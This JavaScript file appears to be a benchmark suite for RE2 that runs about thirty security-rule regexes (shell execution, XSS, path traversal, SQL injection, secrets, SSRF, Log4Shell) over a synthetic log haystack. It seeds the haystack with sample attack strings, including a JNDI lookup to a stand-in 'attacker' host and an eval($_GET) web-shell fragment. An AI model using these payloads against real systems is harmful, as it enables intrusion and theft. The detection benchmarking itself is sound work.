// Shape 1 of the FilteredRE2 evaluation suite: many security-rule-like
// patterns against MB-scale text. Most patterns carry literal substrings
// that a prefilter would catch, and most patterns don't match most chunks
// of the haystack — the regime where FilteredRE2 should shine.
//
// Entrants today: V8 RegExp in a loop, individual RE2 instances in a loop,
// RE2.Set. A future RE2.Filtered entrant slots in by adding one more case.

import {RE2} from '../re2.js';

// ~30 patterns drawn from common security-rule families. Each is a
// case-insensitive search; most have at least one literal substring
// long enough to be a useful prefilter atom.
const patterns = [
  // PHP RCE-ish
  'eval\\s*\\(\\s*\\$_(?:GET|POST|REQUEST|COOKIE)',
  'passthru\\s*\\(',
  'shell_exec\\s*\\(',
  'system\\s*\\(',
  'proc_open\\s*\\(',
  'base64_decode\\s*\\(\\s*\\$',
  // XSS
  '<script[^>]*>',
  'javascript\\s*:',
  'on(?:load|error|click|mouseover)\\s*=',
  '<iframe[^>]*src\\s*=',
  // Path traversal
  '\\.\\.\\/',
  '\\.\\.\\\\',
  'etc\\/passwd',
  'etc\\/shadow',
  'proc\\/self\\/environ',
  // SQL injection
  'union\\s+select',
  'or\\s+1\\s*=\\s*1',
  'drop\\s+table',
  'information_schema\\.',
  'sleep\\s*\\(\\s*\\d',
  // Secrets
  'AKIA[0-9A-Z]{16}',
  'ghp_[0-9A-Za-z]{36}',
  'xox[bpoa]-[0-9A-Za-z-]{10,}',
  '-----BEGIN (?:RSA |EC |DSA |OPENSSH |PGP )?PRIVATE KEY-----',
  // LDAP injection
  '\\(\\|\\(objectClass=',
  '\\(\\&\\(uid=',
  // SSRF / cloud metadata
  '169\\.254\\.169\\.254',
  'metadata\\.google\\.internal',
  // Log4Shell / template injection
  '\\$\\{jndi:',
  '\\$\\{\\s*ldap\\s*:'
];

// Build the haystack: ~1 MB of innocuous-looking content with a few rare
// matches sprinkled in. Deterministic via seeded RNG.
const mulberry32 = seed => () => {
  seed = (seed + 0x6d2b79f5) | 0;
  let t = seed;
  t = Math.imul(t ^ (t >>> 15), t | 1);
  t ^= t + Math.imul(t ^ (t >>> 7), t | 61);
  return ((t ^ (t >>> 14)) >>> 0) / 4294967296;
};

const filler = [
  '2026-05-12T22:31:04.123Z INFO app.module worker 12345 request completed status=200 latency=42ms\n',
  'GET /api/v1/users?limit=20&offset=0 HTTP/1.1 host=example.com user-agent=curl/8.5.0\n',
  'cache hit key=session:abc123 ttl=3600 size=4096 region=us-east-1 fetched from local\n',
  'database query SELECT id, name FROM users WHERE active = true ORDER BY id LIMIT 100\n',
  'config loaded from /etc/app/config.yaml with 47 keys merged from environment\n',
  'sending email to user@example.org subject="welcome" template=onboarding-v3\n',
  'job scheduled id=7821 type=cleanup interval=300s next_run=2026-05-12T23:00:00Z\n',
  'metric counter http_requests_total{method="POST",path="/login"} +1 = 28471\n',
  'starting worker pid=44219 cpu=4 mem=2048M tags=[prod,api,us-west] version=2.3.1\n',
  'auth token validated subject=svc-account/audit scope=read:logs exp=900s\n'
];

const sprinkle = [
  '<script>alert(1)</script>',
  "' OR 1=1 --",
  '../../etc/passwd',
  'eval($_GET["cmd"])',
  '${jndi:ldap://attacker/x}',
  'AKIA1234567890ABCDEF',
  '169.254.169.254/latest/meta-data/'
];

const TARGET_SIZE = 1 << 20; // 1 MiB
const rng = mulberry32(42);
let buf = '';
while (buf.length < TARGET_SIZE) {
  buf += filler[Math.floor(rng() * filler.length)];
  // Sprinkle ~1 match per ~10 KB on average.
  if (rng() < 0.0001)
    buf += sprinkle[Math.floor(rng() * sprinkle.length)] + '\n';
}
const haystack = buf.slice(0, TARGET_SIZE);

// Compile each engine's pattern set once, outside the loop.
const jsList = patterns.map(p => new RegExp(p, 'i'));
const re2List = patterns.map(p => new RE2(p, 'i'));
const re2Set = new RE2.Set(patterns.map(p => '(?i)' + p));

export default {
  RegExp: n => {
    const out = [];
    for (let i = 0; i < n; ++i) {
      const matches = [];
      for (let k = 0; k < jsList.length; ++k) {
        if (jsList[k].test(haystack)) matches.push(k);
      }
      out.pop();
      out.push(matches);
    }
    return out;
  },
  RE2: n => {
    const out = [];
    for (let i = 0; i < n; ++i) {
      const matches = [];
      for (let k = 0; k < re2List.length; ++k) {
        if (re2List[k].test(haystack)) matches.push(k);
      }
      out.pop();
      out.push(matches);
    }
    return out;
  },
  'RE2.Set': n => {
    const out = [];
    for (let i = 0; i < n; ++i) {
      out.pop();
      out.push(re2Set.match(haystack));
    }
    return out;
  }
};
